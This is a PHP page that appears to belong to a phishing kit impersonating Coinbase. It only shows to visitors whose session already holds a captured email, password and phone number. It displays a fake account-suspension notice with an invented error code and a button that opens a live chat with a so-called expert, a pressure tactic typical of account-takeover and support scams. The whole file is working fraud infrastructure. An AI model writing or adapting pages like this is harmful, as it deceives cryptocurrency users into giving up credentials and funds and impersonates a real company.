<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Coinbase Explore| Learn| Businesses| Sign up| Login| Download';
        include_once './meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './header.php'; ?>
        <div class="container">
            <div class="row justify-content-center mt20">
                <div class="col-sm-6 bg-white rounded-2 text-dark p25">
                    <div class="my20">
                        <div class="fs20 py1 fw-bold text-danger">Important Message !</div>
                        <div class="fs16 py1 fw-bold">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.</div>
                        <div class="fs16 py1 fw-bold">Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.</div>
                        <div class="fw-bold fs24 py10 text-center">Error CODE: EBRX1:6X76D</div>
                    </div>
                    <div class="text-center">
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary px20">Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './footer.php'; ?>
    </body>
</html>